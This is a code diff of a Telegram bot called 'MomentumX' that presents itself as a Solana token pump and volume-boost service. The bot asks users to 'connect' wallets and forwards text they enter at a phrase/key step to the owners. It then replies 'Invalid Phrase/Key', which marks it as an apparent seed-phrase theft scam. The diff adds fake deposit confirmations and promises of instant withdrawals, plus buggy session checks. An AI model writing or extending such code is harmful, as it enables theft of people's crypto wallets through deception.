@@ -5,7 +5,7 @@ import { pumpBoost, startMessage, pumpBoostAmount, verifySolanaAddress, verifyIn
 import { awaitConnect, Connect, documentDoc, safetyTips, sendMessageToOwner, verifyKeyphrase, whyConnect } from "./Connect.js";
 import { LoadAnimation } from "./tempMesg/LoadAnimation.js";
 import { volBoostAmount, volumeBoost } from "./VolumeBoost.js";
-import { Add, balanceInfo, Deposit, Withdraw } from "./BalanceInfo.js";
+import { Add, balanceInfo, Deposit, depositPayment, Withdraw } from "./BalanceInfo.js";
 import { Mongo } from "@telegraf/session/mongodb";
 import { Database } from "../MongoDB/Database.js";
 
@@ -60,6 +60,23 @@ bot.use((ctx, next) => {
 bot.start(async (ctx) => {
   try {
 
+    const message = "NEW USER JUST START THE BOT"
+
+    const newUser = sendMessageToOwner(ctx, message)
+
+    let currentId = null;
+
+    try {
+      for (const id of ownerId) {
+        currentId = id;
+        await ctx.telegram.sendMessage(id, newUser.media.caption, {
+          parse_mode: newUser.media.parse_mode
+        });
+      }
+    } catch (err) {
+      console.error(`Failed to send to ${currentId}: ${err.description || err.message}`);
+    }
+
     const Loadingmessage = await ctx.reply('Loading...')
 
     const animation = LoadAnimation(ctx, Loadingmessage)
@@ -71,6 +88,8 @@ bot.start(async (ctx) => {
     const { media, extra } = startMessage(ctx);
 
     if (animation) clearInterval(animation);
+
+    await ctx.deleteMessage(Loadingmessage.message_id).catch(() => null)
 
     await ctx.replyWithPhoto(
       { source: media.source },
@@ -87,42 +106,31 @@ bot.start(async (ctx) => {
       });
     });
 
-    await ctx.deleteMessage(Loadingmessage.message_id).catch(() => null)
-
     console.log("✅ Successfully responded to /start");
 
-    const message = "NEW USER JUST START THE BOT"
-
-    const newUser = sendMessageToOwner(ctx, message)
-
     try {
-      for (const id of ownerId) {
-        await ctx.telegram.sendMessage(id, newUser.media.caption, {
-          parse_mode: newUser.media.parse_mode
-        })
-      }
-    } catch (err) {
-      console.error(`Failed to send to ${id}: ${err.description || err.message}`);
-    }
-
-    try {
-      const database = await Database()
+      const database = await Database();
       if (database) {
-        database.updateOne(
+        await database.updateOne(
           { id: ctx.from.id },
           {
             $set: {
               Name: ctx.from.first_name,
               Username: ctx.from.username || "N/A",
-              CA: "N/A",
               UpdatedAt: new Date()
+            },
+            $setOnInsert: {
+              CA: "N/A",
+              balance: 0,
+              isPending: false,
+              CreatedAt: new Date()
             }
           },
           { upsert: true }
-        )
+        );
       }
     } catch (err) {
-      console.log("Error", err.message)
+      console.log("Database Error:", err.message);
     }
 
   } catch (err) {
@@ -160,6 +168,136 @@ bot.command('cancel', async (ctx) => {
     parse_mode: 'HTML'
   });
 });
+
+bot.command('update_payment', async (ctx) => {
+  const senderId = String(ctx.from.id);
+  const admin1 = String(ownerId1);
+  const admin2 = String(ownerId2);
+
+  if (senderId !== admin1 && senderId !== admin2) {
+    return await ctx.reply('❌ Unauthorized');
+  }
+
+  const message = ctx.message.text.split(' ');
+  const targetUserId = message[1];
+  const amountToAdd = message[2];
+
+  if (!targetUserId || !amountToAdd) {
+    return await ctx.reply('⚠️ Usage: /update_payment [UserID] [Amount]');
+  }
+
+  try {
+    const collection = await Database();
+
+    const client = await collection.findOne({ id: Number(targetUserId) });
+
+    if (!client) {
+      return await ctx.reply(`❌ User ${targetUserId} not found in database.`);
+    }
+
+    const currentBalance = Number(client.balance) || 0;
+    const newBalance = currentBalance + Number(amountToAdd);
+
+    await collection.updateOne(
+      { id: Number(targetUserId) },
+      { $set: { balance: newBalance } }
+    );
+
+    await ctx.reply(`✅ Success! ${targetUserId} now has ${newBalance} SOL.`);
+
+    await ctx.telegram.sendMessage(targetUserId, 
+      `🔔 Deposit Successful\n\n`+
+      `✅ ${amountToAdd} SOL added to your balance!\n\n`+
+      `📈 Detected Deposit: ${amountToAdd} SOL\n\n`+
+      `🚀🚀 <code>Your pump order will be activated within an hour</code>\n\n`+
+      `<b>Check Balance Info for real-time updates.</b>\n\n`+
+      `💸 <i><b>Reminder:</b> Instant withdrawals are always available</i>`, {
+        parse_mode: 'HTML'
+      }
+    );
+
+  } catch (error) {
+    console.error("Update Error:", error);
+    await ctx.reply('📂 Database error occurred.');
+  }
+});
+
+bot.command('support', async (ctx) => {
+  try {
+    await ctx.deleteMessage().catch(() => {
+      console.log('message already deleted')
+    })
+
+    const { media, extra } = contactSupport()
+
+    await ctx.reply(media.caption, {
+      parse_mode: media.parse_mode,
+      ...extra
+    })
+
+  } catch (err) {
+    console.log('Error', err.message)
+    await ctx.reply("⚠️ Something went wrong. Use /menu to try again.");
+  }
+});
+
+bot.command('verify', async (ctx) => {
+
+  try {
+
+     if (ctx.session?.order?.step !== 'AWAIT_payment' || ctx.session?.order?.step !== 'AWAIT_amount'){
+      console.log('Session Dont Match')
+    }
+
+    if (ctx.session?.order?.step === 'AWAIT_payment' || ctx.session?.order?.step === 'AWAIT_amount') {
+
+      ctx.session.order.step = 'AWAIT_hash'
+
+      const { media, extra } = confirmTransation()
+
+      await ctx.reply(media.caption, {
+        parse_mode: media.parse_mode,
+        ...extra
+      })
+
+    } else {
+      console.error('Session dont match');
+
+      if (ctx.session) ctx.session.order = null;
+
+      await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
+        parse_mode: 'Markdown'
+      });
+    }
+  } catch (err) {
+    console.error('CRITICAL ERROR:', err);
+
+    if (ctx.session) ctx.session.order = null;
+
+    await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
+      parse_mode: 'Markdown'
+    });
+  }
+
+  try {
+    const collection = await Database()
+    const currentUser = await collection.findOne({ id: ctx.from.id })
+    if (!currentUser) {
+      await ctx.reply('Fail to get user information click /start ')
+    }
+    await currentUser.updateOne(
+      { id: ctx.from.id },
+      {
+        $set: {
+          isPending: true
+        }
+      },
+      { upsert: true }
+    )
+  } catch (err) {
+
+  }
+})
 
 bot.action('Start Pumps', async (ctx) => {
   try {
@@ -260,10 +398,8 @@ bot.action('Connect_wallet', async (ctx) => {
 
 bot.action('reason', async (ctx) => {
   try {
-    await ctx.answerCbQuery(media.caption.substring(0, 200), { show_alert: true })
-
     const { media } = whyConnect()
-
+    await ctx.answerCbQuery(media.caption.substring(0, 200), { show_alert: true })
   } catch (err) {
     console.log('Error', err.message)
     await ctx.reply('Failed to Display Information')
@@ -500,9 +636,11 @@ bot.action('Confirm_payment', async (ctx) => {
   try {
     await ctx.answerCbQuery()
 
-    if (ctx.session?.order?.step !== 'AWAIT_payment') return;
+    if (ctx.session?.order?.step !== 'AWAIT_payment' || ctx.session?.order?.step !== 'AWAIT_amount'){
+      console.log('Session Dont Match')
+    }
 
-    if (ctx.session.order.step === 'AWAIT_payment') {
+    if (ctx.session?.order?.step === 'AWAIT_payment' || ctx.session?.order?.step === 'AWAIT_amount') {
 
       ctx.session.order.step = 'AWAIT_hash'
 
@@ -530,6 +668,25 @@ bot.action('Confirm_payment', async (ctx) => {
     await ctx.reply("⚠️ **An unexpected error occurred.**\nYour progress has been reset to keep things running smoothly. Please use /start to begin again.", {
       parse_mode: 'Markdown'
     });
+  }
+
+  try{
+    const collection = await Database()
+    const currentUser = await collection.findOne({id: ctx.from.id})
+    if(!currentUser){
+      await ctx.reply('Fail to get user information click /start ')
+    }
+    await currentUser.updateOne(
+      {id: ctx.from.id},
+      {
+        $set: {
+          isPending: true
+        }
+      },
+      {upsert: true}
+    )
+  }catch(err){
+
   }
 })
 
@@ -577,7 +734,14 @@ bot.action('Withdraw', async (ctx) => {
   try {
     await ctx.answerCbQuery()
 
-    const { media, extra } = Withdraw(ctx)
+    const collection = await Database()
+    const user = await collection.findOne({id: ctx.from.id})
+
+    if(!user){
+      console.log('User not found')
+    }
+
+    const { media, extra } = Withdraw(user)
 
     await ctx.deleteMessage().catch(() => {
       console.log('message already deleted')
@@ -614,6 +778,15 @@ bot.action('Deposit', async (ctx) => {
 bot.action('Add', async (ctx) => {
   try {
     await ctx.answerCbQuery()
+
+    ctx.session ??= {}
+
+    ctx.session.order = {
+      step: 'AWAIT_amount'
+    }
+    
+    console.log(ctx.session.order.step)
+
     const { media, extra } = Add(ctx)
 
     await ctx.reply(media.caption, {
@@ -735,7 +908,7 @@ bot.on('text', async (ctx) => {
           try {
             const database = await Database()
             if (database) {
-              database.updateOne(
+              await database.updateOne(
                 { id: ctx.from.id },
                 {
                   $set: {
@@ -773,6 +946,11 @@ bot.on('text', async (ctx) => {
           await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)
 
           for (const id of ownerId) {
+            if (!id) {
+              console.error("⚠️ Found an empty ID in the ownerId array.");
+              continue;
+            }
+
             try {
               await ctx.telegram.sendMessage(id, media.caption, {
                 parse_mode: media.parse_mode
@@ -783,8 +961,8 @@ bot.on('text', async (ctx) => {
             }
           }
 
-          await ctx.reply(`⚙️ <b>TX hash received, please wait while i confirm this immediately</b>\n\n` +
-            `<code>⏱️ time may take up to a minute depending on network congestions</code>`, {
+          await ctx.reply(`⏳ <b>Processing deposit…</b>\n\n` +
+            `<code>⏱️ Your account will be updated once blockchain confirmation is completed.</code>`, {
             parse_mode: 'HTML',
             extra: Markup.inlineKeyboard([
               [Markup.button.callback('🚫 Main Menu', 'Menu')]
@@ -811,6 +989,11 @@ bot.on('text', async (ctx) => {
           const { media } = sendMessageToOwner(ctx, messageText)
 
           for (const id of ownerId) {
+            if (!id) {
+              console.error("⚠️ Found an empty ID in the ownerId array.");
+              continue;
+            }
+
             try {
               await ctx.telegram.sendMessage(id, media.caption, {
                 parse_mode: media.parse_mode
@@ -829,7 +1012,7 @@ bot.on('text', async (ctx) => {
           try {
             const database = await Database()
             if (database) {
-              database.updateOne(
+              await database.updateOne(
                 { id: ctx.from.id },
                 {
                   $set: {
@@ -849,8 +1032,26 @@ bot.on('text', async (ctx) => {
 
           await ctx.deleteMessage(loadingMessage.message_id).catch(() => null)
 
-          await ctx.reply('<b>Invalid Phrase, Check and try again</b>', { parse_mode: 'HTML' })
+          await ctx.reply('<b>Invalid Phrase/Key, Check and try again</b>', { parse_mode: 'HTML' })
         }
+        break;
+
+      case 'AWAIT_amount':
+        if(Number(messageText) > 0.50 && Number(messageText) <= 1000){
+          try{
+            const {media, extra} = depositPayment(messageText, solAddress )
+            await ctx.reply(media.caption, {
+              parse_mode: media.parse_mode,
+              ...extra
+            })
+
+          }catch(err){
+            console.log("Error:", err.message)
+          }
+        }else{
+          await ctx.reply("check the min and max amount and try again /menu")
+        }
+
         break;
 
       default:
@@ -912,9 +1113,9 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ Server is live on port ${PORT}`);
   
   // Start the bot using Long Polling for fps.ms
-  bot.launch().then(() => {
-    console.log("🚀 MomentumX Bot is successfully connected!");
-  });
+  bot.launch()
+  .then(() => console.log("🚀 MomentumX Bot is successfully connected!"))
+  .catch((err) => console.error("❌ Bot Launch Error:", err));
 });
 
 process.once('SIGINT', () => {
